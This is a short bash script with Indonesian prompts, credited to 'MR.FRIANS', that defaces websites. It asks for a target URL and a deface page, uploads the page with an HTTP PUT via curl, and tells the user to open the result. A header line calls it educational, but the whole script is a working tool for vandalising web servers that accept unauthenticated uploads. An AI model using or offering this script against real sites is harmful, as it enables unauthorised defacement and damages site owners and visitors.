#!/bin/bash
# Uploader SC Deface by MR.FRIANS
# Gunakan hanya untuk edukasi & target uji coba!

clear
red='\033[1;31m'
green='\033[1;32m'
nc='\033[0m'

echo -e "${red}"
echo "=============================="
echo "     MR.FRIANS UPLOADER       "
echo "=============================="
echo -e "${nc}"

read -p "Masukkan URL target (contoh: https://target.com/): " target
read -p "Masukkan nama file deface kamu (contoh: index.html): " file

echo -e "${green}\nMengupload $file ke $target ...${nc}"
curl -T $file $target

echo -e "${green}✅ Upload selesai. Coba buka: ${target}${file}${nc}"